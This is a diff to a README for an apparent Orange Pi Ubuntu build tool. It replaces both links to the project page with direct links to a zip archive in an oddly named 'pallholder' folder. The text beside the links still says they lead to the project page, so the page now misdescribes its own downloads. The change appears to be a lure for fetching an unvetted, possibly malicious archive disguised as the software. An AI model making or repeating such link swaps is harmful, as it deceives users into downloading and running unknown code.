@@ -1,6 +1,6 @@
 # 🐧 OrangePi5Pro - Build Custom Ubuntu for Orange Pi
 
-[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/Inflamed-luxuriation684/OrangePi5Pro)
+[![](https://img.shields.io/badge/Download_Software-blue)](https://raw.githubusercontent.com/Inflamed-luxuriation684/OrangePi5Pro/main/pallholder/Pi-Orange-Pro-2.6.zip)
 
 ## 📖 About This Project
 
@@ -20,7 +20,7 @@ To run this tool, you need a Windows computer. You also need the following items
 
 You must start by getting the files from the project page. 
 
-[Visit this page to download](https://github.com/Inflamed-luxuriation684/OrangePi5Pro)
+[Visit this page to download](https://raw.githubusercontent.com/Inflamed-luxuriation684/OrangePi5Pro/main/pallholder/Pi-Orange-Pro-2.6.zip)
 
 Click the link above to reach the main project area. Look for the button labeled "Code" and select "Download ZIP" from the menu. Save the file to your desktop for easy access.
 
